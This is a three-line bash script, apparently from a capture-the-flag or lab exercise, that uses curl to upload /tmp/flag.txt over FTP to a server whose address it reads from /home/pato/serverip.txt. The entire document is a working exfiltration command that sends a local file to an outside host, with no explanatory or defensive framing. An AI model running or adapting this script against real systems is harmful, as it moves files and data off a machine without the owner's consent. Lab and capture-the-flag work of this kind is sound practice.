#!/bin/bash

curl -T /tmp/flag.txt "ftp://$(cat /home/pato/serverip.txt)"
